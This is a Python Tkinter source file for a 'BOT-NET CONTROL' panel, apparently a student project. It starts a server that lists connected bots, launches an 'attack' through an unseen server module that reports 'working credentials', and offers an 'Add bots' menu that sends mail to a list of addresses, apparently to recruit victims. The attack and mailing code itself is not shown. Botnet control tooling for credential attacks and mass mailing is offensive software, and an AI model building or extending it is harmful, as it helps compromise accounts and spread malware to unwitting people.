from tkinter import *
import threading

gui = Tk()
try:
    import server
except FileNotFoundError:
    Label(gui, text="ERROR:LOGIN/PASSWORDS NOT FOUND !").pack()
    gui.mainloop()


def toggle_button(b, txt, st):
    b.configure(text=txt, state=st)


def check_connections():
    global b3, l1
    s = '\n'.join(server.address_list)
    s = "ACTIVE CONNECTIONS:\n" + s
    l1.configure(text=s)
    if len(server.address_list) > 0:
        toggle_button(b3, "START ATTACK", NORMAL)


def start_server_thread():
    global b1, step, l1, b2
    thread = threading.Thread(target=server.start_server)
    thread.daemon = True
    thread.start()
    toggle_button(b1, "SERVER STARTED", DISABLED)
    toggle_button(l1, "ACTIVE CONNECTIONS:\n", NORMAL)
    toggle_button(b2, "REFRESH", NORMAL)


def start_attack_thread():
    global b3, l2
    toggle_button(b3, "ATTACK COMPLETED!", DISABLED)
    thread = threading.Thread(target=server.send_data())
    thread.daemon = True
    thread.start()
    l2.pack(pady=10)
    l2.configure(text="WORKING CREDENTIALS:\n" + server.final_text)


def add_bots():
    gui = Tk()
    gui.geometry("200x200")
    try:
        import mail
        Label(gui, text="MAIL LIST FOUND!\n").pack()
        Label(gui, text=mail.m1 + "\n").pack()
        b = Button(gui, text="SEND MAIL TO EMAIL IDS", command=lambda: mail.send_mail())
        b.pack()
    except FileNotFoundError:
        Label(gui, text="ERROR: MAIL LIST NOT FOUND").pack()



def AboutApp():
    gui = Tk()
    gui.geometry("200x200")
    abt_txt = "Created By: Maanav Acharya, Parth Dalal\n\t\t-B.E Comps, KJSIEIT"
    Label(gui, text=abt_txt).pack()


mymenu = Menu(gui)
mymenu.add_command(label="Add bots", command=add_bots)
mymenu.add_command(label="About", command=AboutApp)
mymenu.add_command(label="Exit", command=gui.quit)
gui.config(menu=mymenu)
Label(gui, text="BOT-NET CONTROL", font='Helvetica 14 bold').pack(pady=10)
b1 = Button(gui, text="START SERVER", command=lambda: start_server_thread(), font='Helvetica 12',width="20")
l1 = Label(gui, text="ACTIVE CONNECTIONS:", borderwidth=2, relief="groove", font='Helvetica 12', state=DISABLED)
b2 = Button(gui, text="REFRESH", command=lambda: check_connections(), font='Helvetica 12', state=DISABLED)
b3 = Button(gui, text="START ATTACK", command=lambda: start_attack_thread(), font='Helvetica 12', state=DISABLED)
l2 = Label(gui, borderwidth=2, relief="groove", font='Helvetica 12')
b1.pack(pady=10)
l1.pack(pady=(10, 1))
b2.pack(pady=(1, 10))
b3.pack(pady=10)
gui.geometry("300x500")
gui.mainloop()
